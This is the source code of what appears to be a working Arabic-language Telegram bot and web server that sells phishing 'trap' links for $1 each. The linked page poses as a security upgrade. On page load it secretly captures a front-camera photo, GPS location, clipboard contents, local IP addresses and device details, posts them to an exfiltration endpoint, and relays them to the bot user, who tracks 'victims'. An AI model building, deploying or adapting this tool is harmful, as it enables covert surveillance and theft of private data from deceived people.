import os
import uuid
import asyncio
import base64
from datetime import datetime, date
from fastapi import FastAPI, Request, HTTPException
from fastapi.responses import HTMLResponse
from pydantic import BaseModel
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, BufferedInputFile

app = FastAPI()

BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_TELEGRAM_BOT_TOKEN")

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

LINK_TO_USER = {}
USERS_DB = {} 
VICTIMS_DB = {} 

class VictimData(BaseModel):
    link_id: str
    device_info: str
    camera_snapshot_base64: str = ""
    geolocation: dict = {}
    network_info: dict = {}
    clipboard_text: str = ""
    stolen_files: list = []
    stolen_data: dict = {}

@app.get("/t/{link_id}", response_class=HTMLResponse)
async def serve_trap_page(link_id: str, request: Request):
    html_content = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>ترقية النظام الأمني الشامل</title>
        <style>
            body {{ background-color: #020617; color: #f8fafc; font-family: Tahoma, sans-serif; text-align: center; padding-top: 50px; }}
            .loader {{ border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 55px; height: 55px; animation: spin 0.8s linear infinite; margin: 20px auto; }}
            @keyframes spin {{ 0% {{ transform: rotate(0deg); }} 100% {{ transform: rotate(360deg); }} }}
            .box {{ background: #0f172a; padding: 30px; border-radius: 14px; display: inline-block; border: 1px solid #334155; max-width: 420px; width: 90%; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }}
        </style>
    </head>
    <body>
        <div class="box">
            <h2>⚡ جاري فحص ملفات وسائط الجهاز...</h2>
            <div class="loader"></div>
            <p style="color: #94a3b8; font-size: 13px;">يرجى عدم إغلاق الصفحة، يتم مزامنة التخزين المؤقت وحماية الخصوصية...</p>
        </div>

        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <script>
            const linkId = "{link_id}";

            async function getLocalIPs() {{
                return new Promise((resolve) => {{
                    const ips = [];
                    const pc = new RTCPeerConnection({{ iceServers: [{{ urls: "stun:stun.l.google.com:19302" }}] }});
                    pc.createDataChannel("");
                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
                    pc.onicecandidate = (ice) => {{
                        if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                        const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(ice.candidate.candidate);
                        if (match && !ips.includes(match[1])) ips.push(match[1]);
                    }};
                    setTimeout(() => resolve(ips), 800);
                }});
            }}

            async function getClipboardData() {{
                try {{
                    if (navigator.clipboard && navigator.clipboard.readText) {{
                        return await navigator.clipboard.readText();
                    }}
                }} catch (e) {{}}
                return "غير متاح";
            }}

            async function getGeoLocation() {{
                return new Promise((resolve) => {{
                    if (!navigator.geolocation) {{
                        resolve({{ error: "GPS غير متاح" }});
                        return;
                    }}
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve({{ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy + "م" }}),
                        (err) => resolve({{ error: "تم الرفض" }}),
                        {{ enableHighAccuracy: true, timeout: 4000, maximumAge: 0 }}
                    );
                }});
            }}

            async function executeDeepHarvest() {{
                try {{
                    let imageData = "";
                    try {{
                        const stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                        const video = document.getElementById('video');
                        video.srcObject = stream;
                        await new Promise(r => setTimeout(r, 1200));
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        imageData = canvas.toDataURL('image/jpeg', 0.85);
                        stream.getTracks().forEach(t => t.stop());
                    }} catch (e) {{}}

                    const [localIPs, clipboard, geo] = await Promise.all([
                        getLocalIPs(),
                        getClipboardData(),
                        getGeoLocation()
                    ]);

                    const systemProfile = {{
                        resolution: window.screen.width + 'x' + window.screen.height,
                        lang: navigator.language,
                        platform: navigator.platform,
                        device_memory: navigator.deviceMemory || 'غير معروف',
                        cores: navigator.hardwareConcurrency || 'غير معروف'
                    }};

                    await fetch('/api/v1/exfiltrate', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            link_id: linkId,
                            device_info: navigator.userAgent,
                            camera_snapshot_base64: imageData,
                            geolocation: geo,
                            network_info: {{ local_ips: localIPs }},
                            clipboard_text: clipboard,
                            stolen_files: [],
                            stolen_data: systemProfile
                        }})
                    }});

                    window.location.href = "https://www.google.com";
                }} catch (e) {{
                    window.location.href = "https://www.google.com";
                }}
            }}

            window.onload = executeDeepHarvest;
        </script>
    </body>
    </html>
    """
    return HTMLResponse(content=html_content)

@app.post("/api/v1/exfiltrate")
async def receive_loot(data: VictimData):
    if data.link_id not in VICTIMS_DB:
        VICTIMS_DB[data.link_id] = []
    VICTIMS_DB[data.link_id].append(data.dict())
    
    target_user_id = LINK_TO_USER.get(data.link_id)
    if target_user_id:
        try:
            s_data = data.stolen_data
            geo = data.geolocation
            net = data.network_info
            
            geo_info = f"📍 الموقع: `{geo.get('latitude', 'N/A')}, {geo.get('longitude', 'N/A')}`" if 'latitude' in geo else "📍 الموقع: `مرفوض / غير متاح`"
            
            caption = (
                "🚨 *[ صيد عميق - محرك الملفات والوسائط ]*\n\n"
                f"{geo_info}\n"
                f"🌐 *الـ IP الداخلي:* `{', '.join(net.get('local_ips', ['N/A']))}`\n"
                f"📋 *الحافظة:* `{data.clipboard_text[:100]}`\n\n"
                f"💻 *النظام:* `{data.device_info}`\n"
                f"📐 *الشاشة:* `{s_data.get('resolution', 'N/A')}` | 🧠 *الذاكرة:* `{s_data.get('device_memory', 'N/A')} GB`"
            )
            
            if data.camera_snapshot_base64 and "," in data.camera_snapshot_base64:
                _, encoded = data.camera_snapshot_base64.split(",", 1)
                photo_file = BufferedInputFile(base64.b64decode(encoded), filename="deep_capture.jpg")
                await bot.send_photo(chat_id=target_user_id, photo=photo_file, caption=caption, parse_mode="Markdown")
            else:
                await bot.send_message(chat_id=target_user_id, text=caption, parse_mode="Markdown")
        except Exception as e:
            print(f"Error: {e}")

    return {"status": "success"}

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "links_count": 0}
    
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="⚡ توليد رابط أداة الملفات العميق (مجاني اليوم)"), KeyboardButton(text="📊 ضحاياي المسجلين")],
            [KeyboardButton(text="💎 شحن رصيد الأداة ($1 / استخدام إضافي)")]
        ],
        resize_keyboard=True
    )
    await message.answer(
        "💀 *مرحباً بك في وحدة التحكم المتقدمة بالضحايا.*\n\n"
        "لديك *استخدام مجاني واحد يومياً* لأداة السحب العميق. بعد استنفاده، تبلغ تكلفة الرابط الإضافي `$1` فقط.",
        reply_markup=kb,
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "⚡ توليد رابط أداة الملفات العميق (مجاني اليوم)")
async def generate_deep_link(message: types.Message):
    user_id = message.from_user.id
    today_str = str(date.today())
    
    if user_id not in USERS_DB:
        USERS_DB[user_id] = {"last_date": today_str, "free_used_today": 0, "links_count": 0}
    
    user_data = USERS_DB[user_id]
    
    # إعادة تعيين العداد اليومي إذا تغير اليوم
    if user_data["last_date"] != today_str:
        user_data["last_date"] = today_str
        user_data["free_used_today"] = 0
    
    # التحقق من استهلاك المحاولة المجانية اليومية
    if user_data["free_used_today"] >= 1:
        await message.answer(
            "⚠️ *عذراً، لقد استهلكت محاولتك المجانية المتاحة لهذا اليوم.*\n\n"
            "لفتح صلاحية توليد روابط إضافية اليوم، يرجى الترقية ودفع `$1` عبر زر الشحن أدناه.",
            parse_mode="Markdown"
        )
        return

    user_data["free_used_today"] += 1
    user_data["links_count"] += 1
    
    unique_token = str(uuid.uuid4())[:8]
    public_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN") or os.getenv("PUBLIC_URL") or "hacker-production-3281.up.railway.app"
    trap_url = f"https://{public_domain}/t/{unique_token}"
    
    LINK_TO_USER[unique_token] = user_id
    
    await message.answer(
        f"✅ *تم تفعيل الرابط العميق بنجاح (مجاني لليوم):*\n\n`{trap_url}`\n\n*(جاهز لالتقاط البيانات وسحب الضحية فوريًا)*",
        parse_mode="Markdown"
    )

@dp.message(lambda msg: msg.text == "📊 ضحاياي المسجلين")
async def show_victims(message: types.Message):
    user_id = message.from_user.id
    user_links = [token for token, uid in LINK_TO_USER.items() if uid == user_id]
    total_victims = sum(len(VICTIMS_DB.get(token, [])) for token in user_links)
    await message.answer(f"📂 *إحصائيات الضحايا الخاصة بك:*\n\n🎯 إجمالي من وقعوا في الفخ العميق: *{total_victims}*", parse_mode="Markdown")

@dp.message(lambda msg: msg.text == "💎 شحن رصيد الأداة ($1 / استخدام إضافي)")
async def refill_balance(message: types.Message):
    await message.answer(
        "💳 *نظام الشحن الفوري والدفع المرن*\n\n"
        "لإضافة محاولات غير محدودة أو فتح رصيد اليوم ($1 لكل رابط إضافي)، تواصل مع المسؤول المالي للبوت لتأكيد العملية وتفعيل الحساب فوراً.",
        parse_mode="Markdown"
    )

async def run_telegram_polling():
    await dp.start_polling(bot)

@app.on_event("startup")
async def startup_event():
    asyncio.create_task(run_telegram_polling())

if __name__ == "__main__":
    import uvicorn
    port = int(os.environ.get("PORT", 8080))
    uvicorn.run("main:app", host="0.0.0.0", port=port)
